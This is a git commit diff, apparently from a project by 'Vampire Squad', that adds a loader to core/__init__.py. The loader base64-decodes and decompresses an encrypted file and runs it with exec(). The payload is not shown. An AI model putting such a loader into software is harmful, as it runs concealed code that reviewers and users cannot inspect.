709d2e9affcb9e36bcb00bb42dd582c49d336356
Vampire Squad <vampiresquad.org@gmail.com>
2025-04-20 09:29:44 +0600

    Update __init__.py

--- core/__init__.py
+++ core/__init__.py
@@ -1,1 +1,11 @@
+import base64, zlib
 
+def load_encrypted_module(enc_path):
+    try:
+        with open(enc_path, 'rb') as f:
+            data = f.read()
+        decoded = zlib.decompress(base64.b64decode(data)).decode()
+        exec(decoded, globals())
+    except Exception as e:
+        print("[ERROR] Failed to load module:", enc_path)
+        print("Reason:", e)
